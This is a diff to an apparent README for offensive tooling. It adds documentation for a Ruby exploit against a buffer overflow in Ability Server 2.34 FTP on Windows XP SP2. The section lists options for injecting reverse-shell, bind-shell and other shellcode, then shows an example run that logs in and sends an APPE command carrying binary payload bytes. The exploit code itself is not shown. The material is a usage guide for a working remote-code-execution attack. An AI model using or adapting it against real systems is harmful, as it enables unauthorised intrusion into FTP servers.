@@ -129,3 +129,38 @@ PASS ftp
 [*] Sending A of size 1201 characters
 ./ftpfuzz.rb:73:in `gets': Connection reset by peer (Errno::ECONNRESET) 
 ```
+ability_appe_exploit.rb
+---------------
+
+Exploit against Ability Server <= 2.34 using buffer - Windows XP SP2 
+
+```
+Usage: ability_appe_exploit.rb [options] ftp-host[:port]
+
+Where available options:
+    -u, --user USER                  FTP Username
+    -p, --pass PASS                  FTP Password
+    -s, --shellcode TYPE             Shellcode to inject
+      Where TYPE can be:
+                          simple
+                          pattern
+                          revshp
+                          revsht
+                          bind
+    -w, --winver                     Windows version
+    -v, --verbose                    Verbose output
+    -h, --help                       Show this help
+```
+Example usage:
+
+```
+$ ability_appe_exploit.rb -u ftp -p ftp -v -s revsht 192.168.11.97
+220 Welcome to Code-Crafters - Ability Server 2.34. (Ability Server 2.34 by Code-Crafters).
+USER ftp
+331 Please send PASS now.
+PASS ftp
+230- Welcome to Code-Crafters - Ability Server 2.34.
+230 User 'ftp' logged in.
+[*] Deliverying the payload...
+APPE ��������������������������....
+```
